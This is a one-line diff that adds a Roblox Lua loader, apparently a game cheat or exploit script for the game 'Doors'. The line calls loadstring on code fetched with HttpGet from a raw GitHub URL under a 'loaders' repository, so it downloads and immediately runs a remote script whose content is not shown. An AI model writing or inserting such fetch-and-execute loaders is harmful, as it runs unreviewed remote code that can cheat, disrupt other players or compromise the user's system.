@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pitroninrank/loaders/main/loaders/doors-spam2-6ysng0z2m9ozzv.lua"))()
